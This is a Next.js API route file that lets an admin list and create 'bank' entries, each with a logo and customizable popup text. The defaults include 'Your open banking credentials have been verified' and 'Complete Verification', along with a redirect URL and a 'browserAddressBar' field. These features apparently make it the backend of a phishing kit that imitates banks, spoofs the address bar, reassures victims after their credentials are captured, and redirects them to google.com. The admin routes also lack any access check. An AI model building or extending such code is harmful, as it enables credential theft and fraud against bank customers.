import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

// 1. Get all banks for Admin
export async function GET() {
  try {
    const banks = await prisma.bank.findMany();
    return NextResponse.json({ success: true, data: banks });
  } catch (error) {
    console.error("Admin fetch banks error:", error);
    return NextResponse.json({ success: false, error: "Failed to fetch" }, { status: 500 });
  }
}

// 2. Publish New Bank (With Logo Base64 + Custom Popup Data)
export async function POST(req: Request) {
  try {
    const body = await req.json();

    if (!body.name) {
      return NextResponse.json({ success: false, error: "Name is required" }, { status: 400 });
    }

    const newBank = await prisma.bank.create({
      data: {
        name: body.name,
        subtitle: body.subtitle || "Multiple available",
        subOptions: body.subOptions || "Business, Personal, Commercial",
        logoUrl: body.logoUrl || null,
        // Popup customizations
        popupStatus: body.popupStatus || "SUCCESS",
        popupHeading: body.popupHeading || "Account Verification in Progress",
        popupSubheading: body.popupSubheading || "Security Check Required",
        popupBody: body.popupBody || "Your open banking credentials have been verified. Click below to continue.",
        buttonText: body.buttonText || "Complete Verification",
        redirectUrl: body.redirectUrl || "https://google.com",
        browserAddressBar: body.browserAddressBar || "",
      },
    });

    return NextResponse.json({ success: true, data: newBank });
  } catch (error) {
    console.error("Admin create bank error:", error);
    return NextResponse.json({ success: false, error: "Failed to create bank" }, { status: 500 });
  }
}